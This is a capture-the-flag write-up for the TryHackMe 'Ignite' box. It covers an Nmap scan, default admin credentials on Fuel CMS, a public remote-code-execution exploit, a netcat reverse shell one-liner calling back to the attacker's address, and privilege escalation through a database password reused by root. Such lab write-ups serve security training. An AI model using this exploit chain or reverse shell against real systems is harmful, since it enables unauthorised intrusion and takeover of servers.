# THM - Ignite

### Ip: 10.10.181.250
### Name: Ignite
### Rating: Easy

------------------------------------------------

thm_ignite_pic.png

#### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Ignite]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.181.250
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-11-19 16:05 CST
Nmap scan report for 10.10.181.250
Host is up (0.13s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.63 seconds
```

Looking at the page on port 80 wee see it is running Fuel cms v 1.4.

thm_ignite_site.png

We also notice that Nmap found a robots.txt page with the `/fuel` endpoint.

Heading to that page we find a simple login:

thm_ignite_login.png

We find we can login with `admin:admin`

thm_ignite_in.png

Looking for exploits I find: https://www.exploit-db.com/exploits/50477

### Exploitation

We can fire the exploit, with no changes needed to the code, with:

```
┌──(ryan㉿kali)-[~/THM/Ignite]
└─$ python exploit.py -u http://10.10.181.250     
[+]Connecting...
Enter Command $whoami
systemwww-data


Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Which gives us a pseudo shell to work with, even if it is a bit wonky.

Let's issue a reverse shell one-line and catch a proper shell:

```
Enter Command $busybox nc 10.6.72.91 443 -e /bin/bash
```

This catches a shell back in our listener:

```
┌──(ryan㉿kali)-[~/THM/Ignite]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.6.72.91] from (UNKNOWN) [10.10.181.250] 51170
hostname
ubuntu
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ whoami
whoami
www-data
```

One the shell is fully stabilized we can grab the first flag:

thm_ignite_user.png

### Privilege Escalation

Browsing the system looking for config files, we find an interesting password in the database.php file:

```
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php 
<SNIP>
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
```

Fortunately for us, this password was reused by root on the target, and we can use it to `su -` and drop into a root shell, where we can then grab the final flag:

thm_ignite_root.png

Thanks for following along!

-Ryan

-----------------------------------------------